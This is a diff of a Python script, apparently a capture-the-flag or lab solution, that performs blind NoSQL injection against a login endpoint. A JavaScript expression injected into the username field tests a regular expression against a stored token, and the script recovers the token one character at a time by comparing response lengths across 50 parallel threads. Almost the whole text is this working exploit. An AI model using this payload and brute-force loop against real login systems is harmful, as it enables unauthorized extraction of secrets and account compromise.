@@ -7,39 +7,37 @@ import string
 import concurrent.futures
 import time
 
-url = "http://83.136.251.226:38620/login"
-proxies = {"http": "http://127.0.0.1:8080"}
-headers = {"Content-type": "application/x-www-form-urlencoded"}
-list= string.ascii_uppercase + string.digits + '-'
+url= "http://83.136.251.226:42794/login"
+proxies= {"http":"http://127.0.0.1:8080"}
+headers= {"Content-type":"application/x-www-form-urlencoded"}       
+list= string.ascii_uppercase + string.digits + '-' 
 
 def test_char(secret, char):
-    data = {
-        "username": f'''"||this.token.match('^{secret}{char}.*')||"''',
-        "password": "test"
-    }
-    response = requests.post(url=url, proxies=proxies, headers=headers, data=data)
+    data= {"username":f'''"||this.token.match('^{secret}{char}.*')||"''',
+           "password":"test"
+           }
+    response= requests.post(url=url, proxies=proxies, headers=headers, data=data)
     return len(response.text) == 2191
 
 def nosqli():
-    secret = ''
+    secret=''
     finished = False    
-    while finished == False:
-        found_char = None      
-        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    while finished == False:                  
+        found_char = None
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:        
             future_to_char = {executor.submit(test_char, secret, char): char for char in list}
-            for future in concurrent.futures.as_completed(future_to_char):
-                char = future_to_char[future]
-                if future.result():
-                    found_char = char
-                    break
+            for future in concurrent.futures.as_completed(future_to_char):        
+                    if future.result():                    
+                        found_char = future_to_char[future]       
+                        break
 
         if found_char:
             secret += found_char
-            print(secret)        
+            print(secret)                      
         else:
             finished = True
 
-try:    
+try:     
     st= time.time()
     nosqli()    
     et= time.time()
